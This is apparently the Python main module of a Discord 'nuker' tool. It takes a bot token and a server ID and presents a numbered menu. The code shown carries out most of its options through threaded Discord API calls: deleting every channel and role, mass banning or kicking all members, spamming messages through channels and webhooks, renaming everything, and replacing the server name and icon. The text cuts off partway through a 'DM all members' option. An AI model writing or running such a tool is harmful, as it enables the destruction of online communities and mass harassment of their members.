# ============================ MAIN MODULES ============================================
import requests as req, time, json
from pystyle import *
from colorama import Fore
from threading import Thread
import asyncio
from random import choice as choisex


# ===============================    CLASSES    =========================================

from Plugins.logger import Logger
from Plugins.tools import Tools
from Plugins.nuking import Nuking
from Plugins.funcs import Funcs
from Plugins.colors import Palette


# =============================== SOME VARS ==================================


global_timeot = 0.0004
palette = Palette()
token = None
names = None
amount = None
guild_name = None
invite_link = None


# ============================== MAIN CODE ==========================================


info = None


async def main(token: str, guild_id):
    headers = {"Authorization": "Bot %s" % token, "Content-Type": 'application/json'}
    System.Clear()
    Funcs.print_logo()
    global info


    if not info:
        info = Tools.information(guild_id, token)

    menu = """
> github.com/Bad-Discord/Discord-Nuker

01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
03. Ban All Members        10. Rename all channels    17. DM all members
04. Kick All Members       11. Rename all roles       18. NUKE
05. Create Channels        12. Nick All Users         19. Exit
06. Create Roles           13. UnNick All users
07. Unban All Members      14. Change Guild Name


"""


    async def back_to_manu():
        input(f"{palette.error}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{palette.fuck}\n")

        return await main(token, guild_id)

    nuker = Nuking(token, guild_id)

    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.red)), menu))
    num = lambda n: "0"+n if len(n) != 2 else n
    pu, re, bl, pi, ye, gr = Col.purple, Col.red, Col.blue, Col.pink, Fore.YELLOW, Fore.GREEN
    choice = Funcs.get_input(f"{Col.orange}┌─╼{re}[{palette.grassy_green}${re}] {Col.orange}{info['user']['username']}{palette.red}@{ye}{info['guild']['name']}\n{Col.orange}└────╼{palette.grey} >>{palette.better_purpule} Choose: {Fore.CYAN}", checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 19)
    choice = num(choice)

    print()


    #  delete all channels

    if choice == "01":

        url = Tools.api("guilds/%s/channels" % guild_id)
        request = req.get(url, headers=headers, proxies=Tools.proxy())

        if request.status_code != 200:
            Logger.Error.error("Failed to fetch channels with status code: %s" % request.status_code)
            return await back_to_manu()

        channels = [i["id"] for i in request.json()]

        def deleter(channel_id):
            if nuker.delete_channel(channel_id):
                Logger.Success.delete(channel_id)
            else:
                Logger.Error.delete(channel_id)

        Logger.Log.started()

        threads = []

        for channel in channels:
            t = Thread(target=deleter, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            # time.sleep(10)
            return await back_to_manu()




    # delete all roles

    elif choice == "02":
        url = Tools.api("guilds/%s/roles" % guild_id)

        request = req.get(url, headers=headers)

        if request.status_code != 200:
            Logger.Error.error("Failed to fetch roles with status code: %s" % request.status_code)
            return await back_to_manu()

        roles = [i["id"] for i in request.json()]

        def delete_role(role):
            status = nuker.delete_role(role)

            if status:
                Logger.Success.delete(role)
            else:
                Logger.Error.delete(role)

        Logger.Log.started()

        threads = []

        for role in roles:
            t = Thread(target=delete_role, args=(role, ))
            t.start()
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()

    # mass ban members

    elif choice == "03":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        total = len(users)
        members_per_arrary = round(total/6)

        members_1, members_2, members_3, members_4, members_5, members_6 = [],[],[],[],[],[]

        for member in users:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        if len(members_4) != members_per_arrary:
                            members_4.append(member)
                        else:
                            if len(members_5) != members_per_arrary:
                                members_5.append(member)
                            else:
                                if len(members_6) != members_per_arrary:
                                    members_6.append(member)
                                else:
                                    pass
        def ban(member):
            if nuker.ban(member):
                Logger.Success.success("Banned %s %s" % (Fore.YELLOW, member))
            else:
                Logger.Error.error("Failed to ban %s %s" % (Fore.RED, member))

        Logger.Log.started()
        while len(members_1) != 0:

            if len(members_1) != 0:
                Thread(target=ban, args=(members_1[0], )).start()
                members_1.pop()

            if len(members_2) != 0:
                Thread(target=ban, args=(members_2[0], )).start()
                members_2.pop()

            if len(members_3) != 0:
                Thread(target=ban, args=(members_3[0], )).start()
                members_3.pop()

            if len(members_4) != 0:
                Thread(target=ban, args=(members_4[0], )).start()
                members_4.pop()

            if len(members_5) != 0:
                Thread(target=ban, args=(members_5[0], )).start()
                members_5.pop()

            if len(members_6) != 0:
                Thread(target=ban, args=(members_6[0], )).start()
                members_6.pop()

        return await back_to_manu()

    # Mass Kick members

    elif choice == "04":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)
        def kick(member):
            if nuker.kick(member):
                Logger.Success.success("Kicked %s%s" % (Fore.YELLOW, member))
            else:
                Logger.Error.error("Failed to kick %s%s" % (Fore.RED, member))

        total = len(users)
        members_per_arrary = round(total/6)

        members_1, members_2, members_3, members_4, members_5, members_6 = [],[],[],[],[],[]

        for member in users:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        if len(members_4) != members_per_arrary:
                            members_4.append(member)
                        else:
                            if len(members_5) != members_per_arrary:
                                members_5.append(member)
                            else:
                                if len(members_6) != members_per_arrary:
                                    members_6.append(member)
                                else:
                                    pass

        Logger.Log.started()


        while len(members_1) != 0:

            if len(members_1) != 0:
                Thread(target=kick, args=(members_1[0], )).start()
                members_1.pop()

            if len(members_2) != 0:
                Thread(target=kick, args=(members_2[0], )).start()
                members_2.pop()

            if len(members_3) != 0:
                Thread(target=kick, args=(members_3[0], )).start()
                members_3.pop()

            if len(members_4) != 0:
                Thread(target=kick, args=(members_4[0], )).start()
                members_4.pop()

            if len(members_5) != 0:
                Thread(target=kick, args=(members_5[0], )).start()
                members_5.pop()

            if len(members_6) != 0:
                Thread(target=kick, args=(members_6[0], )).start()
                members_6.pop()

        return await back_to_manu()

    # mass create channels

    elif choice == "05":
        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
        count = Funcs.get_input("How many channels do you want to create? [1,500]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500)
        count = int(count)
        channel_type = Funcs.get_input("Enter the type of the channels: [text, voice]: ", lambda x: x.lower().strip() in ["text", "voice"])

        types = {"voice": 2, "text": 0}

        Logger.Log.started()

        def create(name, channel_type):
            status = nuker.create_channel(name, channel_type)

            if status:
                Logger.Success.create(status)
            else:
                Logger.Error.create(name)

        threads = []

        for _ in range(count):
            t = Thread(target=create, args=(name, types[channel_type]))
            t.start()
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()


    # mass create roles

    elif choice == "06": 
        name = Funcs.get_input("Enter a name for roles: ", lambda x: len(x) < 100 and x != "")
        count = Funcs.get_input("How many roles do you want to create? [1,250]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 250)
        count = int(count)

        Logger.Log.started()

        def create(name):
            status = nuker.create_role(name)
            if status:
                Logger.Success.create(status)
            else:
                Logger.Error.create(name)

        threads = []

        for _ in range(count):
            t = Thread(target=create, args=(name, ))
            t.start()
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()

    elif choice == "07":
        url = Tools.api(f"/guilds/{guild_id}/bans")
        banned_users = await Tools.break_limit(url, token)

        Logger.Log.started()

        def unban(member):
            if nuker.unban(member):
                Logger.Success.success("Unbanned %s" % member)
            else:
                Logger.Error.error("Failed to unban %s" % member)

        threads = []

        for banned in banned_users:
            t = Thread(target=unban, args=(banned, ))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()

    elif choice == "08":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
        count = Funcs.get_input("how many times do you want to send this message? [1, ∞]: ", lambda x: x.isnumeric() and int(x) != 0)

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error("There was an error while fetching channels: %s" % request.status_code)
            return await back_to_manu()

        channels = [i["id"] for i in request.json()]

        chunk_size = round(len(channels) / 2)

        def mass_webhook(channels):
            def create_webhook(channel):
                status = nuker.create_webhook(channel)
                if status:
                    Logger.Success.create(status)
                    with open("./Scraped/webhooks.txt", "a") as fp: fp.write(status+"\n")
                    Thread(target=nuker.send_webhook, args=(status, message, int(count))).start()
                else:
                    Logger.Error.error("Failed to create webhook from %s" % channel)

            for channel in channels:
                Thread(target=create_webhook, args=(channel, )).start()
                time.sleep(global_timeot)

        channels = Tools.chunker(channels, chunk_size)
        Logger.Log.started()

        threads = []

        for channel_list in channels:
            t = Thread(target=mass_webhook, args=(channel_list, ))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()


    elif choice == "09":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
        count = Funcs.get_input("how many times do you want to send this message? [1, ∞]: ", lambda x: x.isnumeric() and int(x) != 0)

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error("There was an error while fetching channels: %s" % request.status_code)
            return await back_to_manu()

        channels = [i["id"] for i in request.json()]

        def send_message(channel, message):
            if nuker.send_message(channel, message):
                Logger.Success.success("Sent message in %s%s" % (Fore.BLUE, channel))
            else:
                Logger.Error.error("Failed to send message in %s" % channel)

        Logger.Log.started()

        threads = []

        for i in range(int(count)):
            for channel in channels:
                t = Thread(target=send_message, args=(channel, message))
                t.start()
                threads.append(t)
                time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()

    elif choice == "10":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) <= 100 and x != "")  

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error("There was an error while fetching channels: %s" % request.status_code)
            return await back_to_manu()

        channels = [i["id"] for i in request.json()]


        def rename(channel, name):
            if nuker.rename_channel(name, channel):
                Logger.Success.success("renamed %s" % channel)
            else:
                Logger.Error.error("Failed to rename %s" % channel)

        Logger.Log.started()

        threads = []

        for channel in channels:
            t = Thread(target=rename, args=(channel, name))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()

    elif choice == "11":
        name = Funcs.get_input("Enter a name for roles: ", lambda x: len(x) <= 100 and x != "")
        url = Tools.api("guilds/%s/roles" % guild_id)

        request = req.get(url, headers=headers)

        if request.status_code != 200:
            Logger.Error.error("Failed to fetch roles with status code: %s" % request.status_code)
            return await back_to_manu()

        roles = [i["id"] for i in request.json()]

        def rename(role_id, name):
            if nuker.rename_role(role_id, name):
                Logger.Success.success("Renamed %s" % role_id)
            else:
                Logger.Error.error("Failed to rename %s" % role_id)

        Logger.Log.started()

        threads = []

        for role in roles:
            t = Thread(target=rename, args=(role, name))
            t.start()
            threads.append(t)
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()


    elif choice == "12":
        name = Funcs.get_input("Enter a nick name for members: ", lambda x: len(x) <= 100 and x != "")
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def change(member, nick):
            if nuker.change_nick(member, nick):
                Logger.Success.success("Changed nickname for %s" % member)
            else:
                Logger.Error.error("Failed to change nickname for %s" % member)

        Logger.Log.started()

        threads = []
        for user in users:
            t = Thread(target=change, args=(user, name))
            threads.append(t)
            t.start()
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()


    elif choice == "13":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def change(member, nick):
            if nuker.change_nick(member, nick):
                Logger.Success.success("Changed nickname for %s" % member)
            else:
                Logger.Error.error("Failed to change nickname for %s" % member)

        Logger.Log.started()

        threads = []
        for user in users:
            t = Thread(target=change, args=(user, None))
            threads.append(t)
            t.start()
            time.sleep(global_timeot)
        else:
            for thread in threads: thread.join()
            return await back_to_manu()


    elif choice == "14":
        name = Funcs.get_input("Enter a nick name for guild: ", lambda x: len(x) <= 100 and x != "")

        Logger.Log.started()

        if nuker.rename_guild(name):
            Logger.Success.success("Changed Guild name to %s" % name)
        else:
            Logger.Error.error("Failed to change name")

        return await back_to_manu()

    elif choice == "15":
        Cursor.HideCursor()
        path = Funcs.get_input("Drag and drop the new icon or enter its path(use 'd' for default icon in root folder): ", lambda x: (x == 'd') or (os.path.exists(x) and (x.endswith(".jpg") or x.endswith(".png") )))
        path = path if not path == 'd' else "./server_icon.png"

        Logger.Log.started()

        if nuker.change_guild_icon(path):
            Logger.Success.success("Changed Guild icon")
        else:
            Logger.Error.error("Failed to change icon")

        Cursor.ShowCursor()
        return await back_to_manu()


    elif choice == "16":
        url = Tools.api(f"guilds/{guild_id}/emojis")
        request = req.get(url, headers=headers)

        if not request.status_code == 200:
            Logger.Error.error("There was an error while fetching guild emojis")
            return await back_to_manu()

        emojis = [[i["id"], i["name"]] for i in request.json()]

        Logger.Log.started()


        for id, name in emojis:
            if nuker.remove_emoji(id):
                Logger.Success.delete("%s - %s" % (id, name))
            else:
                Logger.Error.delete("%s - %s" % (id, name))
        else:
            return await back_to_manu()

    elif choice == "17":
        message = Funcs.get_input("Enter a message for send to them direct message: ", lambda x: x != "" and len(x) 